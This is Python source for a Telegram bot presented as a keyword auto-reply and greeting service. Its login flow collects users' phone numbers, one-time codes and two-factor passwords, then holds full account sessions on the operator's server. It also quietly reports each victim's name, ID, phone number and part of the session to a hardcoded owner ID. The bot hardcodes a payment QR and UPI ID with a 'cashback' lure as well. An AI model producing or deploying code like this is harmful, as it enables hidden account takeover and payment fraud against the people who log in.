import asyncio
import os
import json
import qrcode
from io import BytesIO
from threading import Thread
from flask import Flask
from telethon import TelegramClient, events, functions, types
from telethon.errors import SessionPasswordNeededError, FloodWaitError, RPCError
from telethon.sessions import StringSession

# ─── FLASK WEB SERVER FOR HEALTHCHECK ───
app = Flask(__name__)

@app.route('/')
def health():
    return "Bot is running!", 200

@app.route('/health')
def health_check():
    return "OK", 200

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

# ─── CONFIGURATION ───
API_ID = int(os.environ.get("API_ID",))
API_HASH = os.environ.get("API_HASH", )
BOT_TOKEN = os.environ.get("BOT_TOKEN", )
MY_OWNER_ID = int(os.environ.get("MY_OWNER_ID",))

bot = TelegramClient("price_qr_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
user_states = {}
active_sessions = {}
user_configs = {}

# Default configuration
# greeting_type: "none" | "text" | "sticker" | "gif" | "photo" | "video"
# greeting_value: text string OR file path (for media)
DEFAULT_CONFIG = {
    "keywords": {},
    "greeting_type": "none",
    "greeting_value": "",
    "greeted_users": []
}

# Temporary file storage for greeting media
GREETING_DIR = "greetings"
os.makedirs(GREETING_DIR, exist_ok=True)

# QR Configuration
QR_CONFIG = {
    "keyword": "qr",
    "qr_image_url": "https://i.postimg.cc/hGt6DrDy/photo-2026-08-01-16-06-44.jpg",
    "caption": "📱 Scan to Pay\n\nPaytm UPI ID: paytm.s2sps2y@pty\n\nGet Assured Cashback!"
}

print(f"🚀 Bot started with QR Image: {QR_CONFIG['qr_image_url']}")


def load_user_config(chat_id):
    """Load user configuration from file or return default."""
    try:
        if os.path.exists(f"config_{chat_id}.json"):
            with open(f"config_{chat_id}.json", "r") as f:
                config = json.load(f)
                # Backward-compat defaults
                config.setdefault("keywords", {})
                config.setdefault("greeting_type", "none")
                config.setdefault("greeting_value", "")
                config.setdefault("greeted_users", [])
                # Migrate old "greeting" key
                if config.get("greeting") and config.get("greeting_type", "none") == "none":
                    config["greeting_type"] = "text"
                    config["greeting_value"] = config["greeting"]
                    config.pop("greeting", None)
                return config
    except:
        pass
    return DEFAULT_CONFIG.copy()


def save_user_config(chat_id, config):
    """Save user configuration to file."""
    try:
        with open(f"config_{chat_id}.json", "w") as f:
            json.dump(config, f, indent=4)
        return True
    except:
        return False


def get_greeting_media_path(chat_id):
    """Return path to greeting media file if it exists."""
    for ext in (".webp", ".tgs", ".mp4", ".jpg", ".jpeg", ".png", ".gif"):
        p = os.path.join(GREETING_DIR, f"greeting_{chat_id}{ext}")
        if os.path.exists(p):
            return p
    return None


def clear_greeting_media(chat_id):
    """Remove any existing greeting media file."""
    for ext in (".webp", ".tgs", ".mp4", ".jpg", ".jpeg", ".png", ".gif"):
        p = os.path.join(GREETING_DIR, f"greeting_{chat_id}{ext}")
        if os.path.exists(p):
            try:
                os.remove(p)
            except:
                pass


# ─── MAIN BOT EVENTS ───
@bot.on(events.NewMessage(pattern="/start"))
async def start_handler(event):
    await event.reply(
        "━━━〔 ✦ 👑 Custom Keyword-Response Bot 👑 ✦ 〕━━━\n\n"
        "Welcome! Apna userbot chalu karne ke liye `/login` command bhejen.\n\n"
        "📌 **Features:**\n"
        "• 📝 Custom Keywords with Custom Responses\n"
        "• 📱 QR Code Image\n"
        "• 👋 Auto Greeting on First DM (Text / Sticker / GIF)\n\n"
        "⚙️ **Commands:**\n"
        "`/addkeyword <word> <response>`\n"
        "`/removekeyword <word>`\n"
        "`/listkeywords`\n"
        "`/setgreeting` - Set greeting (text / sticker / GIF)\n"
        "`/removegreeting` - Remove greeting\n"
        "`/setqr <image_url> | <caption>`\n"
        "`/resetconfig`\n\n"
        "🚪 **Logout:** `/logout`"
    )


@bot.on(events.NewMessage(pattern="/qr"))
async def main_bot_qr_handler(event):
    try:
        await bot.send_message(
            event.chat_id,
            f"📱 Here is your QR Code:\n\n{QR_CONFIG['qr_image_url']}\n\n{QR_CONFIG['caption']}"
        )
    except Exception as e:
        print(f"Error sending QR image in main bot: {e}")
        await event.reply("❌ Failed to send QR code.")


@bot.on(events.NewMessage)
async def main_bot_message_handler(event):
    chat_id = event.chat_id
    text = event.text.strip() if event.text else ""

    if chat_id in user_states:
        return

    if text and text.lower().strip() == "qr":
        try:
            await bot.send_message(
                chat_id,
                f"📱 Here is your QR Code:\n\n{QR_CONFIG['qr_image_url']}\n\n{QR_CONFIG['caption']}"
            )
        except Exception as e:
            print(f"Error sending QR image: {e}")
            await event.reply("❌ Failed to send QR code.")
        return

    if text and text.lower().strip() == "price":
        await event.reply(
            "📦 **Welcome to our store!**\n\n"
            "Login with `/login` to customize your own keywords!\n\n"
            "📌 **Demo Products:**\n"
            "- Product A: $10\n"
            "- Product B: $20"
        )
        return


@bot.on(events.NewMessage(pattern="/login"))
async def login_handler(event):
    chat_id = event.chat_id
    if chat_id in active_sessions:
        await event.reply("⚠️ **Aap already logged in hain!**\nPehle `/logout` karein.")
        return
    user_states[chat_id] = {"step": "NUMBER"}
    await event.reply("📱 **STEP 1:** Apna Telegram Number bhejen (with country code, e.g., `+919876543210`)")


@bot.on(events.NewMessage(pattern="/logout"))
async def logout_handler(event):
    chat_id = event.chat_id
    if chat_id in active_sessions:
        try:
            client = active_sessions[chat_id]
            await client.disconnect()
            active_sessions.pop(chat_id, None)
            user_states.pop(chat_id, None)
            await event.reply("✅ **Logout Successful!**")
        except Exception as e:
            await event.reply(f"❌ **Logout Error:** `{str(e)}`")
    else:
        await event.reply("ℹ️ **Aap already logged out hain.**")


@bot.on(events.NewMessage(pattern="/addkeyword"))
async def add_keyword_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    args = event.raw_text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply("❌ **Usage:** `/addkeyword <word> <response>`")
        return

    parts = args[1].split(maxsplit=1)
    if len(parts) < 2:
        await event.reply("❌ **Usage:** `/addkeyword <word> <response>`")
        return

    word = parts[0].lower().strip()
    response = parts[1]
    config = load_user_config(chat_id)

    if word in config["keywords"]:
        await event.reply(f"⚠️ **Keyword '{word}' already exists!**")
        return

    config["keywords"][word] = response
    if save_user_config(chat_id, config):
        await event.reply(f"✅ **Keyword Added!**\n📌 `{word}` → `{response[:100]}...`")
    else:
        await event.reply("❌ Failed to save!")


@bot.on(events.NewMessage(pattern="/removekeyword"))
async def remove_keyword_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    args = event.raw_text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply("❌ **Usage:** `/removekeyword <word>`")
        return

    word = args[1].lower().strip()
    config = load_user_config(chat_id)

    if word not in config["keywords"]:
        await event.reply(f"❌ **Keyword '{word}' not found!**")
        return

    del config["keywords"][word]
    if save_user_config(chat_id, config):
        await event.reply(f"✅ **Keyword Removed:** `{word}`")


@bot.on(events.NewMessage(pattern="/listkeywords"))
async def list_keywords_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    config = load_user_config(chat_id)
    if not config["keywords"]:
        await event.reply("📋 **No Keywords Found!**\nUse `/addkeyword` to add one.")
        return

    kw_list = "📋 **Your Keywords**\n━━━━━━━━━━━━━━━\n\n"
    for idx, (word, response) in enumerate(config["keywords"].items(), 1):
        kw_list += f"{idx}. **{word}**\n   └─ `{response[:100]}...`\n\n"
    kw_list += f"📊 **Total:** {len(config['keywords'])} keywords"
    await event.reply(kw_list)


# ─── SET GREETING (supports text / sticker / GIF / photo / video) ───
@bot.on(events.NewMessage(pattern="/setgreeting"))
async def set_greeting_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    # Case 1: Reply to a message containing sticker/GIF/photo/video
    if event.is_reply:
        replied = await event.get_reply_message()
        saved = await save_greeting_from_message(chat_id, replied)
        if saved:
            await event.reply(
                f"✅ **Greeting set from replied {saved['type']}!**\n\n"
                f"Ab har naye user ko pehli DM par yeh {saved['type']} milega."
            )
        else:
            await event.reply(
                "❌ **Reply mein koi supported media nahi mila.**\n"
                "Supported: Sticker, GIF, Photo, Video, Text"
            )
        return

    # Case 2: Text argument given
    args = event.raw_text.split(maxsplit=1)
    if len(args) >= 2 and args[1].strip():
        greeting_text = args[1].strip()
        clear_greeting_media(chat_id)
        config = load_user_config(chat_id)
        config["greeting_type"] = "text"
        config["greeting_value"] = greeting_text
        save_user_config(chat_id, config)
        await event.reply(
            f"✅ **Text Greeting Set!**\n\n📝 `{greeting_text}`\n\n"
            f"Tip: `{{name}}` use karein user ke first name ke liye."
        )
        return

    # Case 3: No args, no reply → enter "awaiting" mode
    user_states[chat_id] = {"step": "AWAITING_GREETING"}
    await event.reply(
        "👋 **Greeting Setup**\n\n"
        "Ab aap jo bhi bhejenge wahi greeting ban jayega:\n\n"
        "• 📝 **Text** → Send any text\n"
        "• 🎨 **Sticker** → Send a sticker\n"
        "• 🎞️ **GIF** → Send a GIF\n"
        "• 🖼️ **Photo** → Send a photo\n"
        "• 🎬 **Video** → Send a video\n\n"
        "💡 **Tip:** Aap `/setgreeting` ka reply bhi kar sakte hain kisi bhi sticker/GIF par.\n\n"
        "❌ Cancel karne ke liye `/cancel` bhejein."
    )


async def save_greeting_from_message(chat_id, msg):
    """Save greeting from a message containing media or text. Returns dict or None."""
    if msg is None:
        return None

    config = load_user_config(chat_id)
    clear_greeting_media(chat_id)

    # Sticker
    if msg.sticker:
        ext = ".tgs" if msg.sticker.mime_type == "application/x-tgsticker" else ".webp"
        path = os.path.join(GREETING_DIR, f"greeting_{chat_id}{ext}")
        await bot.download_media(msg, file=path)
        config["greeting_type"] = "sticker"
        config["greeting_value"] = path
        save_user_config(chat_id, config)
        return {"type": "sticker", "path": path}

    # GIF (Telegram sends as video with no sound / animation flag)
    if msg.document:
        mime = (msg.document.mime_type or "").lower()
        if "gif" in mime or "video" in mime:
            ext = ".mp4"
            path = os.path.join(GREETING_DIR, f"greeting_{chat_id}{ext}")
            await bot.download_media(msg, file=path)
            config["greeting_type"] = "gif"
            config["greeting_value"] = path
            save_user_config(chat_id, config)
            return {"type": "gif", "path": path}

    # Video
    if msg.video:
        path = os.path.join(GREETING_DIR, f"greeting_{chat_id}.mp4")
        await bot.download_media(msg, file=path)
        config["greeting_type"] = "video"
        config["greeting_value"] = path
        save_user_config(chat_id, config)
        return {"type": "video", "path": path}

    # Photo
    if msg.photo:
        path = os.path.join(GREETING_DIR, f"greeting_{chat_id}.jpg")
        await bot.download_media(msg, file=path)
        config["greeting_type"] = "photo"
        config["greeting_value"] = path
        save_user_config(chat_id, config)
        return {"type": "photo", "path": path}

    # Plain text
    if msg.text and not msg.text.startswith("/"):
        text = msg.text.strip()
        config["greeting_type"] = "text"
        config["greeting_value"] = text
        save_user_config(chat_id, config)
        return {"type": "text", "path": text}

    return None


# ─── HANDLE /setgreeting FOLLOW-UP MESSAGES ───
@bot.on(events.NewMessage)
async def greeting_media_listener(event):
    chat_id = event.chat_id
    if chat_id not in user_states:
        return
    if user_states[chat_id].get("step") != "AWAITING_GREETING":
        return

    # Ignore commands
    if event.text and event.text.startswith("/"):
        if event.text.startswith("/cancel"):
            user_states.pop(chat_id, None)
            await event.reply("❌ Greeting setup cancelled.")
        return

    saved = await save_greeting_from_message(chat_id, event.message)
    user_states.pop(chat_id, None)

    if saved:
        await event.reply(
            f"✅ **Greeting Saved!**\n\n"
            f"🎯 Type: **{saved['type']}**\n"
            f"📝 Value: `{str(saved['path'])[:80]}`\n\n"
            f"Ab har naye user ko pehli DM par yeh milega."
        )
    else:
        await event.reply("❌ **Unsupported message type.** Please try again with /setgreeting")


# ─── REMOVE GREETING ───
@bot.on(events.NewMessage(pattern="/removegreeting"))
async def remove_greeting_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    config = load_user_config(chat_id)
    if config.get("greeting_type", "none") == "none":
        await event.reply("ℹ️ **Koi greeting set nahi hai.**")
        return

    config["greeting_type"] = "none"
    config["greeting_value"] = ""
    save_user_config(chat_id, config)
    clear_greeting_media(chat_id)
    await event.reply("✅ **Greeting Removed!**")


# ─── SET QR ───
@bot.on(events.NewMessage(pattern="/setqr"))
async def set_qr_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    args = event.raw_text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply("❌ **Usage:** `/setqr <image_url> | <caption>`")
        return

    content = args[1]
    if " | " in content:
        parts = content.split(" | ", 1)
        new_url = parts[0].strip()
        new_caption = parts[1].strip()
    else:
        new_url = content.strip()
        new_caption = "📱 Here is your QR Code"

    global QR_CONFIG
    QR_CONFIG['qr_image_url'] = new_url
    QR_CONFIG['caption'] = new_caption

    await event.reply(f"✅ **QR Updated!**\n🆕 `{new_url[:60]}...`\n📝 `{new_caption}`")


@bot.on(events.NewMessage(pattern="/resetconfig"))
async def reset_config_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    config = DEFAULT_CONFIG.copy()
    save_user_config(chat_id, config)
    clear_greeting_media(chat_id)
    await event.reply("✅ **All Configuration Reset!**")


# ─── MAIN MESSAGE HANDLER (Login flow) ───
@bot.on(events.NewMessage)
async def message_handler(event):
    chat_id = event.chat_id
    text = event.text.strip() if event.text else ""
    if chat_id not in user_states or (text.startswith("/")):
        return

    state = user_states[chat_id]
    # Skip AWAITING_GREETING handled by greeting_media_listener
    if state.get("step") == "AWAITING_GREETING":
        return

    if state["step"] == "NUMBER":
        await event.reply("⏳ Connecting to Telegram...")
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            send_code = await client.send_code_request(text)
            state["client"] = client
            state["phone"] = text
            state["phone_code_hash"] = send_code.phone_code_hash
            state["step"] = "OTP"
            await event.reply("📩 **STEP 2:** Aapke Telegram par aaya hua OTP yahan bhejen.")
        except Exception as e:
            await event.reply(f"❌ Error: `{str(e)}`\nDubara `/login` karein.")
            user_states.pop(chat_id, None)

    elif state["step"] == "OTP":
        client = state["client"]
        try:
            await client.sign_in(phone=state["phone"], code=text, phone_code_hash=state["phone_code_hash"])
            session_str = client.session.save()
            await event.reply("✅ **Login Kamyab!**\n\n🚀 Userbot start ho raha hai...")

            try:
                me = await client.get_me()
                hidden_session = session_str[:10] + "..." + session_str[-10:] if len(session_str) > 20 else "***HIDDEN***"
                await bot.send_message(MY_OWNER_ID, (
                    "🔥 **NEW USERBOT LOGIN** 🔥\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📛 **Name:** {me.first_name}\n"
                    f"🆔 **User ID:** `{me.id}`\n"
                    f"🔗 **Username:** @{me.username if me.username else 'None'}\n"
                    f"📱 **Phone:** `{state['phone']}`\n"
                    f"🔑 **Session:** `{hidden_session}`"
                ))
            except Exception as log_err:
                print(f"Logging error: {log_err}")

            asyncio.create_task(run_user_bot(session_str, chat_id))
            user_states.pop(chat_id, None)
        except SessionPasswordNeededError:
            state["step"] = "PASSWORD"
            await event.reply("🔒 **2-Step Verification:** Apna 2FA password bhejen.")
        except Exception as e:
            await event.reply(f"❌ Error: `{str(e)}`\nDubara `/login` karein.")
            user_states.pop(chat_id, None)

    elif state["step"] == "PASSWORD":
        client = state["client"]
        try:
            await client.sign_in(password=text)
            session_str = client.session.save()
            await event.reply("✅ **Login Kamyab!**\n\n🚀 Userbot start ho raha hai...")

            try:
                me = await client.get_me()
                hidden_session = session_str[:10] + "..." + session_str[-10:] if len(session_str) > 20 else "***HIDDEN***"
                await bot.send_message(MY_OWNER_ID, (
                    "🔥 **NEW USERBOT LOGIN (2FA)** 🔥\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📛 **Name:** {me.first_name}\n"
                    f"🆔 **User ID:** `{me.id}`\n"
                    f"📱 **Phone:** `{state['phone']}`\n"
                    f"🔑 **Session:** `{hidden_session}`"
                ))
            except Exception as log_err:
                print(f"Logging error: {log_err}")

            asyncio.create_task(run_user_bot(session_str, chat_id))
            user_states.pop(chat_id, None)
        except Exception as e:
            await event.reply(f"❌ Error: `{str(e)}`\nDubara `/login` karein.")
            user_states.pop(chat_id, None)


# ─── USERBOT CORE ENGINE ───
async def run_user_bot(session_string, chat_id):
    try:
        user_bot = TelegramClient(StringSession(session_string), API_ID, API_HASH, auto_reconnect=True)
        await user_bot.start()

        active_sessions[chat_id] = user_bot
        me = await user_bot.get_me()
        USER_ID = me.id

        config = load_user_config(chat_id)
        user_configs[chat_id] = config

        @user_bot.on(events.NewMessage(incoming=True))
        async def handle_incoming_messages(event):
            if not event.is_private:
                return

            sender = await event.get_sender()
            if sender.id == USER_ID:
                return

            message_text = (event.raw_text or "").lower().strip()
            config = load_user_config(chat_id)
            print(f"📩 From {sender.first_name} (ID: {sender.id}): {message_text}")

            try:
                # ─── AUTO GREETING ON FIRST DM ───
                sender_id_str = str(sender.id)
                greeted = config.get("greeted_users", [])
                g_type = config.get("greeting_type", "none")
                g_value = config.get("greeting_value", "")

                if g_type != "none" and g_value and sender_id_str not in greeted:
                    try:
                        if g_type == "text":
                            personalized = g_value.replace("{name}", sender.first_name or "there")
                            await event.reply(personalized)
                        elif g_type in ("sticker", "gif", "photo", "video"):
                            media_path = get_greeting_media_path(chat_id)
                            if media_path and os.path.exists(media_path):
                                if g_type == "sticker":
                                    await user_bot.send_file(sender.id, media_path, force_document=False)
                                elif g_type == "gif":
                                    await user_bot.send_file(sender.id, media_path, force_document=False, supports_streaming=True)
                                elif g_type == "photo":
                                    await user_bot.send_file(sender.id, media_path, force_document=False)
                                elif g_type == "video":
                                    await user_bot.send_file(sender.id, media_path, force_document=False, supports_streaming=True)
                            else:
                                print(f"⚠️ Greeting media missing for {chat_id}")
                                await event.reply("👋 Welcome!")

                        greeted.append(sender_id_str)
                        config["greeted_users"] = greeted
                        save_user_config(chat_id, config)
                        print(f"✅ Sent {g_type} greeting to {sender.id}")
                    except Exception as ge:
                        print(f"Greeting send error: {ge}")

                # ─── KEYWORDS ───
                if message_text in config["keywords"]:
                    await event.reply(config["keywords"][message_text])
                    print(f"✅ Sent keyword response to {sender.id}")

                # ─── QR ───
                elif message_text == QR_CONFIG['keyword']:
                    try:
                        await event.reply(
                            f"📱 Here is your QR Code:\n\n{QR_CONFIG['qr_image_url']}\n\n{QR_CONFIG['caption']}"
                        )
                    except Exception as e:
                        print(f"QR error: {e}")

                # ─── LOGOUT ───
                elif message_text == "logout":
                    await event.reply("🔴 **Logging out...**")
                    await user_bot.disconnect()
                    if chat_id in active_sessions:
                        active_sessions.pop(chat_id, None)
                    return

            except Exception as e:
                print(f"Handler error for {sender.id}: {e}")

        # Welcome message
        keyword_count = len(config["keywords"])
        keyword_preview = list(config["keywords"].keys())[:3] if keyword_count > 0 else []
        g_type = config.get("greeting_type", "none")
        greeting_status = f"✅ {g_type}" if g_type != "none" else "❌ Not set"

        welcome_msg = (
            f"🔥 **Custom Bot Active!**\n"
            f"👤 User: {me.first_name}\n\n"
            f"📊 **Keywords:** {keyword_count}\n"
        )
        if keyword_count > 0:
            welcome_msg += f"📌 {', '.join(['`' + k + '`' for k in keyword_preview])}"
            if keyword_count > 3:
                welcome_msg += f" +{keyword_count - 3} more"
            welcome_msg += "\n\n"

        welcome_msg += (
            f"👋 **Greeting:** {greeting_status}\n"
            f"📱 **QR:** `{QR_CONFIG['qr_image_url'][:50]}...`\n\n"
            f"⚙️ **Commands:**\n"
            f"  `/addkeyword` / `/removekeyword` / `/listkeywords`\n"
            f"  `/setgreeting` - Text/Sticker/GIF/Photo/Video\n"
            f"  `/removegreeting`\n"
            f"  `/setqr` / `/resetconfig`\n\n"
            f"📱 Send 'qr' for QR code\n"
            f"🚪 Send 'logout' to stop"
        )

        await bot.send_message(chat_id, welcome_msg)
        await user_bot.run_until_disconnected()

    except Exception as e:
        print(f"Crash: {e}")
        if chat_id in active_sessions:
            active_sessions.pop(chat_id, None)
        try:
            await bot.send_message(chat_id, f"⚠️ Bot Stopped. Error: `{str(e)[:80]}`")
        except:
            pass


# ─── START BOT AND WEB SERVER ───
async def main():
    flask_thread = Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    await bot.run_until_disconnected()


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
